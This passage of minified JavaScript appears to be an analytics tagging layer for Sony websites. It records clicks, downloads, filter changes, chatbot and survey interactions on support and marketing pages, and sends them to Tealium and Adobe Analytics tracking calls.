.accordion__item").length||"";var e=document.querySelectorAll(".alpha-academy-video-training .accordion__header")||"",t=[];e.forEach((function(e){e.querySelector("H2")&&t.push(e.querySelector("H2").innerText)})),t=t.join(","),utag_data.aaRegionalV154=t},_bsq.aa.sau_alphaAcademyCollapsible=function(){document.querySelectorAll(".accordion .accordion__header h2").forEach((function(e){e.addEventListener("click",(function(t){var a=t.target.innerText||"",o=/show/.test(e.closest(".accordion__header").className)?"expanded":"collapsed";utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaLinkType="o",utag_data.aaLinkName="Module interaction - Accordion "+o+": "+a,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))}))},_bsq.aa.sau_alphaAcademyVideoOpen=function(){document.querySelectorAll(".alpha-academy-thumb").forEach((function(e){e.addEventListener("click",(function(t){var a=e.querySelector("#videoTitle")?e.querySelector("#videoTitle").innerHTML:"";utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaLinkType="o",utag_data.aaLinkName="Module interaction - Video Open: "+a,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))}))},_bsq.aa.regional_bannerClick=function(){document.addEventListener("clickedBanner",(function(e){var t=e.detail.bannerType||"",a=e.detail.bannerName||"";if("b2b"===u.page.section)if("product"===t||"highlighted-products"===a){var o=function(e){utag_data.aaLinkTrackVars="pageName,events,prop7,prop10,prop23,prop21,prop22,prop9,eVar5,eVar6,eVar7,eVar27,eVar20,eVar21,eVar22,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaInteractionType="Module interaction - "+e,utag_data.aaLinkType="o",utag_data.aaLinkName="Module interaction - "+e,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())};"product"===t&&o("Product Click: "+a),"highlighted-products"===a&&o("Hero Banner: "+a)}else _bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+t+"|"+a);else _bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+t+"|"+a)}))},_bsq.aa.b2b_secondaryNav=function(){document.addEventListener("secondaryNavClicked",(function(e){var t=e.detail.name||"";_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"nv:menu|"+t)}))},_bsq.aa.b2b_conversionClick=function(){document.addEventListener("conversionClicked",(function(e){var t=e.detail.type;utag_data.aaLinkTrackVars="pageName,events,prop7,prop10,prop23,prop21,prop22,prop9,eVar5,eVar6,eVar7,eVar27,eVar20,eVar21,eVar22,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaInteractionType="Module interaction - Conversion Clicked: "+t,utag_data.aaLinkType="o",utag_data.aaLinkName="Module interaction - Conversion Clicked: "+t,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.b2b_blockTracking=function(){document.addEventListener("blockExpand",(function(e){var t=e.detail.expand?"expand":"collapse",a=e.detail.articleName,o=utag_data.aaPageTemplate+" | Module interaction - Article "+t+": "+a;utag_data.aaLinkTrackVars="pageName,events,prop7,prop10,prop23,prop21,prop22,prop9,eVar5,eVar6,eVar7,eVar27,eVar20,eVar21,eVar22,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaInteractionType=o,utag_data.aaLinkType="o",utag_data.aaLinkName=o,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.myfavorites_FavoriteProductsList=function(){if(""!==_bsq.utils.docCookies.getItem("gwt_favorite_products"))var e=_bsq.utils.docCookies.getItem("gwt_favorite_products").split(",");return e||[]},_bsq.aa.usa_productRegistration=function(e){"undefined"!=typeof jQuery&&/(usa|ca):product registration:signup/gi.test(e)&&jQuery("body #registria_form").on("submit",(function(e){"1"===jQuery('input[type="hidden"][name="user[receive_product_communication]"]').val()?_bsq.utils.docCookies.setItem(_bsq.aa.newsletterSubProductRegistrationCookieName,"true"):_bsq.utils.docCookies.setItem(_bsq.aa.newsletterSubProductRegistrationCookieName,"")}))},_bsq.aa.usa_productRegistrationUnmatchedModels=function(e){"undefined"!=typeof jQuery&&["usa:product registration:home","usa:product registration:product locker","usa:product registration:product locker:registration complete","usa:product registration:product locker:registration complete reward","ca:product registration:home","ca:product registration:product locker","ca:product registration:product locker:registration complete","ca:product registration:product locker:registration complete reward"].indexOf(e)>-1&&jQuery("#model").on("focusout",(function(e){var t=jQuery(this).val().toLowerCase();0===jQuery("ul.frauto-list li").length&&-1===[].indexOf(t)&&t.length>2&&(utag_data.aaLinkTrackVars="pageName,prop10,prop23,prop21,prop22,prop9,prop56,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar24",utag_data.aaRegionalC56=t,utag_data.aaLinkType="o",utag_data.aaLinkName="Product Registration - Unmatched Model",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))}))},_bsq.aa.sau_storiesFilterSelection=function(){if(document.addEventListener("sauFiltersChanged",(function(e){try{_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,e.detail.filters)}catch(e){}})),document.addEventListener("readystatechange",(function(e){if("complete"===e.target.readyState)try{_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,_stateJoin(_tokenizedToQueryObject(window.location.search)))}catch(e){}})),""!==u.page.filters){var e=[];("events"!==u.page.name?u.page.filters.replaceAll("[]","").split("&"):u.page.filters.split("&")).forEach((function(t){/=$/.test(t)||e.push(t)})),e=e.join(";");try{setTimeout((function(){_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,e)}),1500)}catch(e){}}document.addEventListener("filtersUpdated",(function(e){var t=void 0!==e.detail&&(e.detail.filters,1)?e.detail.filters:"";t=t&&"events"!==u.page.name?t=t.replaceAll("[]","").split("&"):t.split("&");var a=[];t.forEach((function(e){/=$/.test(e)||a.push(e)})),a=a.join(";");try{_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,a)}catch(e){}}))},_bsq.aa.sau_featuredProducts=function(){jQuery(".products a").length>0&&jQuery("body").on("click",".products a",(function(e){var t=this.href.split("?")[0],a="";a=t.indexOf("/product/")>1?t.split("/product/")[1]:jQuery.trim(jQuery(this).find(".product-thumbnail__text__title").text()),utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaInteractionType="Module interaction - featured product:"+a,utag_data.aaLinkType="o",utag_data.aaLinkName="featured_product:"+a,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.prs_filterSelection=function(){document.addEventListener("filtersUpdated",(function(e){var t=void 0!==e.detail&&(e.detail.filter,1)?e.detail.filter:"";try{_bsq.utils.docCookies.setItem(_bsq.aa.filtersCookieName,t)}catch(e){}}))},_bsq.aa.spt_getDeepestCategoryLevel=function(e){var t="";if(void 0!==e&&e.constructor===Array)for(i=0;i<e.length;i++)void 0!==e[i]&&null!==e[i]&&""!==e[i]&&(t=e[i]);return t},_bsq.aa.spt_getProductName=function(e){var t="";return void 0!==e&&e.constructor===Array&&e.length>=1&&(t=e[0]),t},_bsq.aa.spt_loadMoreServerCall=function(){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar70",utag_data.aaLinkTrackEvents="event40",utag_data.aaEvents.push("event40"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="Support - Load more results",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())},_bsq.aa.spt_searchLoadMoreServerCall=function(){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,prop41,eVar10,eVar70",utag_data.aaLinkTrackEvents="event37",utag_data.aaEvents.push("event37"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="Support search results - Load more:"+utag_data.aaSearchTerm,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())},_bsq.aa.spt_manualLanguageChange=function(e,t){jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-manuals-sorting",clickedElement:"Support manuals | Module interaction - Change language: "+e+" to "+t,clickedElementType:"Support manuals - Change language: "+e+" to "+t})},_bsq.aa.spt_modelsSortChange=function(e,t){jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-models-sorting",clickedElement:"Support models | Module interaction - Sort change: "+e+" to "+t,clickedElementType:"Support models - Sort change: "+e+" to "+t})},_bsq.aa.spt_compatibilityProductChange=function(e,t){jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-compatibity-search",clickedElement:"Support compatibility | Module interaction - Product search: "+e+">"+t.toUpperCase(),clickedElementType:"Support compatibility - Product search: "+e+">"+t.toUpperCase(),additionalVariables:"prop46,eVar30"})},_bsq.aa.spt_download_filters=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("span.dropdown-button-text").on("DOMSubtreeModified",(function(e){var t=jQuery(e.currentTarget).closest("section").prev(".visuallyhidden.moduleTags").data("mastername")||"",a=jQuery(e.currentTarget).text()||"";if("downloads"===t&&!1===/select (operating|download)/gi.test(a)){var o=jQuery(e.currentTarget).closest("div.downloads__form-wrapper").is(":first-child")?"OS filter":"Category filter",i="Support download filters - "+o+":"+a;jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"",masterName:"spt_"+t,clickedElement:"spt_"+t+" | "+i,clickedElementType:"spt_download_filters_"+o.toLowerCase()}),_bsq.aa.spt_download_filters_is_set=!0}else"downloads"===t&&!0===/select (operating|download)/gi.test(a)&&(_bsq.aa.spt_download_filters_is_set=!1)}))},_bsq.aa.spt_supportByType=function(){var e=["all","downloads","manuals","faqs"];"undefined"!=typeof jQuery&&jQuery("body").on("click","a.type-filter__menu__item",(function(t){var a="";jQuery(".type-filter__menu > a").each((function(o,i){i!==t.target&&i!==t.target.parentNode||(a=e[o])}));sony.digitalData.support.filter_type===a||!0===/^(none)$/gi.test(sony.digitalData.support.filter_type)&&"all"===a||(utag_data.aaLinkTrackVars="pageName,events,products,prop10,prop23,prop21,prop22,prop9,prop46,prop47,eVar27,eVar20,eVar21,eVar22,prop41,eVar10,eVar30,eVar32,eVar37,eVar70",utag_data.aaLinkTrackEvents="event45",utag_data.aaEvents.push("event45"),utag_data.aaSWTNavigationChannel="navigation",utag_data.aaSWTFilterType=a,utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="Support by Type - Filter content: "+a,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))}))},_bsq.aa.spt_trackDownloads=function(){document.addEventListener("download_file",(function(e){var t="",a="";try{var o=sony.digitalData.download||{};void 0!==o.download_number?t=o.download_number:void 0!==o.number&&(t=o.number),void 0!==o.url&&(t+="|"+o.url),void 0!==o.download_type?a=o.download_type:void 0!==o.type&&(a=o.type)}catch(e){}if(""===t&&""===a)try{void 0!==e&&void 0!==e.detail&&null!==e.detail&&void 0!==e.detail.download&&null!==e.detail.download&&void 0!==e.detail.download.number&&void 0!==e.detail.download.url&&void 0!==e.detail.download.type&&(t=(e.detail.download.number||"")+"|"+(e.detail.download.url||""),a=e.detail.download.type||"")}catch(e){}var i="",r="";try{void 0!==e&&void 0!==e.detail&&null!==e.detail&&void 0!==e.detail.download&&null!==e.detail.download&&(void 0!==e.detail.download.addEvents&&null!==e.detail.download.addEvents&&(i=e.detail.download.addEvents),void 0!==e.detail.download.searchTerm&&null!==typeof e.detail.download.searchTerm&&(r=e.detail.download.searchTerm))}catch(e){}utag_data.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop22,prop9,prop48,prop49,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,prop46,eVar30,eVar57,eVar70",utag_data.aaLinkTrackEvents="event4",utag_data.aaEvents.push("event4"),""!==r&&(utag_data.aaLinkTrackVars+=",prop42",utag_data.aaClickedSearchResultPosition=r.replace(" | ",":"),utag_data.aaClickedSearchResultPosition=utag_data.aaClickedSearchResultPosition+":organic",utag_data.aaLinkTrackEvents=utag_data.aaLinkTrackEvents+(i?","+i:""),i&&utag_data.aaEvents.push(i)),utag_data.aaDownloadType=a,utag_data.aaDownloadName=t,utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="Support - File download",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.spt_downloadTracking=function(e){var t="",a="",o="";try{t=e.href,a=jQuery(e).find(".item-headline").text().replace("[PDF]",""),o="manual"}catch(d){}var i="",r="",n=0;if(window.location.href.toLowerCase().indexOf("/results")>-1&&window.location.href.toLowerCase().indexOf("/electronics/support")>-1){i="event39";try{var s=jQuery(".generic-results .item-link");clickedResult=jQuery(e).closest(".generic-results .item-link"),n=s.index(clickedResult)+1}catch(d){}try{r=sony.digitalData.search.term}catch(d){}""===r&&void 0!==utag_data.aaSearchTerm&&(r=utag_data.aaSearchTerm||""),""!==r&&(r=n+" | "+r)}var d={detail:{download:{number:a,url:t,type:o,addEvents:i,searchTerm:r}}},c="",l="";try{var u=sony.digitalData.download||{};void 0!==u.download_number&&""!==u.download_number?c=u.download_number:void 0!==u.number&&""!==u.number&&(c=u.number),void 0!==u.url&&""!==u.url&&(c+="|"+u.url),void 0!==u.download_type&&""!==u.download_type?l=u.download_type:void 0!==u.type&&""!==u.type&&(l=u.type)}catch(d){}if(""===c&&""===l)try{c=(d.detail.download.number||"")+"|"+(d.detail.download.url||""),l=d.detail.download.type||""}catch(e){}var g="",p="";try{g=d.detail.download.addEvents,p=d.detail.download.searchTerm}catch(e){}sgwn.linkTrackVars="pageName,products,events,prop10,prop23,prop21,prop22,prop9,prop48,prop49,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,prop46,eVar30,eVar57",sgwn.linkTrackEvents="event4",sgwn.events="event4",""!==p&&(sgwn.linkTrackVars+=",prop42",sgwn.prop42=p.replace(" | ",":"),sgwn.prop42=sgwn.prop42+":organic",sgwn.linkTrackEvents=sgwn.linkTrackEvents+(g?","+g:""),sgwn.events=sgwn.events+(g?","+g:"")),sgwn.prop49=l,sgwn.eVar57=c,sgwn.prop48=c,sgwn.linkName="Support - File download";var m=new CustomEvent("custom_download_file",{detail:{download:{number:c,url:t,type:l,addEvents:g,searchTerm:p}}});document.dispatchEvent(m),_bsq.aa.cleanregisterPostTrackCallback=1},_bsq.aa.spt_countInternalSearches=function(e){if(void 0===e&&(e=!1),e){a=_bsq.utils.docCookies.getItem(_bsq.aa.searchAttemptsCookieName);a=parseInt(a),t=Number.isInteger(a)&&a!==Number.NaN?a+"":"0"}else{var t="0";if(a=_bsq.utils.docCookies.getItem(_bsq.aa.searchAttemptsCookieName),""!==_bsq.utils.docCookies.getItem(_bsq.aa.searchAttemptsCookieName)){var a=_bsq.utils.docCookies.getItem(_bsq.aa.searchAttemptsCookieName);a=parseInt(a),Number.isInteger(a)&&a!==Number.NaN&&(t=(a+=1)+"",_bsq.utils.docCookies.setItem(_bsq.aa.searchAttemptsCookieName,t))}else _bsq.utils.docCookies.setItem(_bsq.aa.searchAttemptsCookieName,"1"),t="1"}return t},_bsq.aa.spt_faqClicksInSection=function(){"undefined"!=typeof jQuery&&jQuery("#"+["faq_result_group-container","important_information-container","popular_topics-container","downloads-container","documents-container","smart_help-container"].join(",#")).on("click","button.item-link,a.item-link,a.eu-support__link",(function(e){var t=/\/tvhelp\//gi.test(document.URL)?jQuery(e.target).closest("div.test-wrapper > div").attr("class")||"":jQuery(e.target).closest("section").attr("id")||"";!1===/-container/gi.test(t)&&(t+="-container"),_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:"+t)}))},_bsq.aa.spt_supportNavigationChannel=function(){var e="";return/^spt:.*(|_)results/gi.test(utag_data.aaPageName||"")?e="search":/^spt-chatbot$/gi.test(utag_data.aaInternalTrackingCode||"")?e="chatbot":(/^(hf|nv):/gi.test(utag_data.aaNavigationLinkCookie)||/^cl:/gi.test(utag_data.aaNavigationLinkCookie)&&!/^spt:/gi.test(utag_data.aaPreviousPageName||"")||""===utag_data.aaNavigationLinkCookie&&/\/support/gi.test(utag_data.aaReferrer||""))&&(e="navigation"),e},_bsq.aa.spt_microSurveyTracking=function(){document.addEventListener("miniSurveySubmit",(function(e){if(void 0!==e&&void 0!==e.detail&&null!==e.detail){if(utag_data.aaLinkTrackVars="pageName,events,prop10,prop21,prop22,prop23,prop9,prop50,eVar7,eVar27,eVar20,eVar21,eVar22,eVar31,eVar34",void 0!==e.detail.question1&&null!==e.detail.question1&&""!==e.detail.question1&&(void 0!==e.detail.answer1&&null!==e.detail.answer1&&"yes"===e.detail.answer1.toLowerCase()&&(utag_data.aaLinkTrackEvents="event43",utag_data.aaEvents.push("event43")),void 0!==e.detail.answer1&&null!==e.detail.answer1&&"no"===e.detail.answer1.toLowerCase()&&(utag_data.aaLinkTrackEvents="event42",utag_data.aaEvents.push("event42"))),void 0!==e.detail.question2&&null!==e.detail.question2&&""!==e.detail.question2&&(void 0!==e.detail.answer3&&null!==e.detail.answer3&&1==e.detail.answer3?void 0!==e.detail.answer2&&null!==e.detail.answer2&&""!==e.detail.answer2?(utag_data.aaLinkTrackEvents="event44,event41",utag_data.aaEvents.push("event44","event41")):(utag_data.aaLinkTrackEvents="event41",utag_data.aaEvents.push("event41")):void 0!==e.detail.answer2&&null!==e.detail.answer2&&""!==e.detail.answer2&&(utag_data.aaLinkTrackEvents="event44",utag_data.aaEvents.push("event44"))),void 0!==e.detail.question1&&null!==e.detail.question1&&""!==e.detail.question1&&void 0!==e.detail.response_id&&void 0!==e.detail.answer1)utag_data.aaSWTMicroSurvey=(e.detail.response_id||"")+"|"+(e.detail.question1||"")+"|"+(e.detail.answer1||"")+"|||";else{var t="no";void 0!==e.detail.answer3&&null!==e.detail.answer3&&1==e.detail.answer3&&(t="yes"),void 0!==e.detail.response_id&&void 0!==e.detail.question2&&void 0!==e.detail.answer2&&(utag_data.aaSWTMicroSurvey=(e.detail.response_id||"")+"|||"+(e.detail.question2||"")+"|"+(e.detail.answer2||"")+"|"+t)}var a="1";void 0!==e.detail.question2&&""!==e.detail.question2&&(a="2"),utag_data.aaLinkType="o",utag_data.aaLinkName="Micro survey submission - Question: "+a,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}}))},_bsq.aa.spt_chatBotOpened=function(){document.addEventListener("aaChatbotOpened",(function(){utag_data.aaLinkTrackVars="pageName,events,products,prop10,prop23,prop21,prop22,prop9,prop46,eVar27,eVar20,eVar21,eVar22,prop41,eVar10,eVar30,eVar70",utag_data.aaLinkTrackEvents="event46",utag_data.aaEvents.push("event46"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="Support - Chatbot Opened",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.spt_video_banner=function(){if("undefined"!=typeof jQuery&&void 0!==jQuery().on){var e="";jQuery("body").on("click","div.eu-support__container.with-overlay-video a",(function(t){var a=null!==(e=jQuery(t.currentTarget).parent("div").attr("style")).match(/img\.youtube\.com\/vi\/.*\//gi)&&e.match(/img\.youtube\.com\/vi\/.*\//gi)[0]||[];a=a.replace(/img\.youtube\.com\/vi\//gi,"").replace("/","");var o=jQuery(t.currentTarget).find(".eu-support__title").text();o=o.replace(": "," ").replace(":"," ");jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-video-banner-overlay",clickedElement:"Support - video banner click: "+o+" ("+a+")",clickedElementType:"spt_video_banner_click"})}))}},_bsq.aa.spt_collapsible_sections=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery(document).on("click","button.collapseComponent__button",(function(e){var t=jQuery(e.currentTarget).closest(".collapseComponent__title").text()||"";t=t.replace(jQuery(e.currentTarget).closest(".collapseComponent__title").find("button.collapseComponent__button > span").text(),"");var a="false"===jQuery(e.currentTarget).attr("aria-expanded")?"open":"close",o="Module interaction - section "+a+":"+t;jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-collapsible-section",clickedElement:"spt_collapsible_section | "+o,clickedElementType:"spt_collapsible_section_"+a})}))},_bsq.aa.spt_euChatInteraction=function(){document.addEventListener("aaSptEUChatInteraction",(function(e){jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-parkersoft-chat",clickedElement:"Support - EU chat interaction: "+e.detail.interaction,clickedElementType:"Support - EU chat interaction: "+e.detail.interaction})}))},_bsq.aa.gwt_euChatInteraction=function(){document.addEventListener("aaGwtEUChatInteraction",(function(e){utag_data.aaRegionalV166=e.detail.chatid,jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"gwt-parkersoft-chat",clickedElement:"EU Marketing - Sales chat interaction: "+e.detail.interaction,clickedElementType:"EU Marketing - Sales chat interaction: "+e.detail.interaction,additionalVariables:"eVar166"})}))},_bsq.aa.gwt_hkChatInteraction=function(){document.addEventListener("aaGwtHKChatInteraction",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar70,eVar151",utag_data.aaLinkTrackEvents="event100",utag_data.aaEvents.push("event100"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,void 0!==e&&void 0!==e.detail&&void 0!==e.detail.interaction&&(utag_data.aaRegionalV151="HK Marketing - "+e.detail.interaction,utag_data.aaLinkType="o",utag_data.aaLinkName="HK Marketing - "+e.detail.interaction,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))}))},_bsq.aa.setDatalayerObject=function(e){var t={};try{t=_bsq.data.initDataLayer(utag_data.website_platform)||{}}catch(e){}if(/^global:(gwt|swt)$/gi.test(e)){if(void 0!==t&&void 0!==t.page.country){null!==t.page.country.match(/(ar|mx|cl|co|pa|cr|bo|do|ec|sv|gt|hn|py|pe|pr|ve|ni|sola)/i)&&""!==_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id")&&(_bsq.utils.isLocalStorageSupported()&&localStorage.setItem(_bsq.aa.customerID_localStorageKey,_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id")),t.user.reporting_key=_bsq.utils.getQueryParameter(location.search.toLowerCase(),"scst_id"))}t.user.id=t.user.reporting_key||t.user.id||"",_bsq.utils.isLocalStorageSupported()&&(("www.sony-latin.com"===document.domain.toLowerCase()||document.domain.toLowerCase().indexOf("syndication-sola.com")>-1)&&""===t.user.id||~document.URL.indexOf("/corporate/")&&""===t.user.id?t.user.id=localStorage.getItem(_bsq.aa.customerID_localStorageKey):"US"!==t.page.country&&"CA"!==t.page.country||""!==t.user.id||(t.user.id=localStorage.getItem(_bsq.aa.customerID_localStorageKey))),(~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/4k-tvs")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/smart-tvs")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/led-tvs")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/3d-tvs"))&&""===t.product.category1&&(t.product.category1="tv-home-cinema"),(~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/wireless-headphones")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/noise-cancelling-headphones")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/bluetooth-headphones"))&&""===t.product.category1&&(t.product.category1="audio"),(~document.URL.toLowerCase().indexOf("www.sony.co.uk/full-frame-cameras")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/dslr-like-cameras")||~document.URL.toLowerCase().indexOf("www.sony.co.uk/electronics/waterproof-cameras"))&&""===t.product.category1&&(t.product.category1="cameras"),""===t.page.name&&""===t.page.section&&/web.sony-asia.com\/sg\/(my-sony|mysony)/gi.test(document.URL)&&(t.page.name="amea:mysony:"+document.location.pathname.replace(/\/sg\/(my-sony-|mysony-)/gi,"").replace(/sg/gi,"").replace(/\//gi,""),t.page.section="amea")}return""===t.page.section&&/campaign\.odw\.sony-europe\.com/gi.test(document.URL)&&(t.page.section="odw"),t},_bsq.aa.spt_ajaxPageReload=function(e){utag.DB("| ======== SPT AJAX PAGE LOAD ");var t=!0;if(void 0!==e&&void 0!==e.detail&&null!==e.detail&&void 0!==e.detail.trigger&&null!==e.detail.trigger&&void 0!==e.detail.trigger.type&&null!==e.detail.trigger.type&&"load-more"===e.detail.trigger.type&&(t=!1),void 0!==e&&void 0!==e.detail&&null!==e.detail&&void 0!==e.detail.trigger&&null!==e.detail.trigger&&void 0!==e.detail.trigger.type&&null!==e.detail.trigger.type&&"language-change"===e.detail.trigger.type&&(t=!1),void 0!==e&&void 0!==e.detail&&null!==e.detail&&void 0!==e.detail.trigger&&null!==e.detail.trigger&&void 0!==e.detail.trigger.type&&null!==e.detail.trigger.type&&"sort-change"===e.detail.trigger.type&&(t=!1),void 0===e||void 0===e.detail||null===e.detail||void 0===e.detail.trigger||null===e.detail.trigger||void 0===e.detail.trigger.type||null===e.detail.trigger.type||"compatibility-complete-search"!==e.detail.trigger.type&&"compatibility-start-search"!==e.detail.trigger.type||(t=!1),void 0===e||null!=e.detail||""===_bsq.utils.getQueryParameter(window.location.search,"download-category")&&""===_bsq.utils.getQueryParameter(window.location.search,"operating-system")&&!1!==_bsq.aa.spt_download_filters_is_set||(t=!1),t&&(utag.DB(" ---- New Page Server call "+t),_bsq.aa.trackPageView("client",utag_data.website_platform,"unloadMetrics:true")),!t&&void 0!==e&&void 0!==e.detail&&null!==e.detail&&void 0!==e.detail.trigger&&null!==e.detail.trigger&&void 0!==e.detail.trigger.type&&null!==e.detail.trigger.type)if("load-more"===e.detail.trigger.type&&-1===e.detail.trigger.module.indexOf("results"))_bsq.aa.spt_loadMoreServerCall();else if("load-more"===e.detail.trigger.type&&-1!==e.detail.trigger.module.indexOf("results"))_bsq.aa.spt_searchLoadMoreServerCall();else if("language-change"===e.detail.trigger.type){var a="",o="";try{a=e.detail.trigger.old_value,o=e.detail.trigger.new_value}catch(e){}_bsq.aa.spt_manualLanguageChange(a,o)}else if("sort-change"===e.detail.trigger.type){var i="",r="";try{i=e.detail.trigger.old_value,r=e.detail.trigger.new_value}catch(e){}_bsq.aa.spt_modelsSortChange(i,r)}else if("compatibility-complete-search"===e.detail.trigger.type){var n="",s="";try{n=e.detail.trigger.category,s=e.detail.trigger.product}catch(e){}_bsq.aa.spt_compatibilityProductChange(n,s)}},_bsq.aa.spt_spaPageReload=function(e){_bsq.aa.trackPageView("client",utag_data.website_platform,"unloadMetrics:true")},_bsq.aa.spt_spaInteractionTracking=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click",".custom_steps_div,#div_step_arrow button",(function(){var e=jQuery("#h4_parent_topic").text(),t=jQuery("#sub_header_text").text(),a=""!=jQuery(".currentStep").parent().siblings().children().text()?jQuery(".currentStep").parent().siblings().children().text():jQuery(".currentStep a").text();jQuery("body").trigger({type:"moduleInteraction",lv1:"",lv2:"support",masterName:"spt-tv-guide",clickedElement:"Support TV Guide | Module interaction - Step click: "+e+" - "+t+" - "+a,clickedElementType:"Support TV Guide - ctep Click: "+e+" - "+t+" - "+a})}))},_bsq.aa.spt_getOSFirmwareVersion=function(){""!==_bsq.utils.getQueryParameter(document.URL,"androidver")&&""!==_bsq.utils.getQueryParameter(document.URL,"pkgver")&&(utag_data.aaOSFirmwareVersion=_bsq.utils.getQueryParameter(document.URL,"androidver")+"|"+_bsq.utils.getQueryParameter(document.URL,"pkgver")),""!==_bsq.utils.getQueryParameter(document.URL,"fwVer",!0)&&(utag_data.aaOSFirmwareVersion="|"+_bsq.utils.getQueryParameter(document.URL,"fwVer",!0))},_bsq.aa.spt_getTogglePattern=function(){""!==_bsq.utils.getQueryParameter(document.URL,"pattern",!0)&&(utag_data.aaTogglePattern=_bsq.utils.getQueryParameter(document.URL,"pattern",!0))},_bsq.aa.regional_newsletterSubscriptionTracking=function(e){if(void 0!==e&&"mynewsletters"===e&&"undefined"!=typeof subscribeNews){var t=subscribeNews;subscribeNews=function(e,a){var o="";if("undefined"!=typeof jQuery)o=jQuery("#subscriptionArea"+e+" h3").text().trim();return 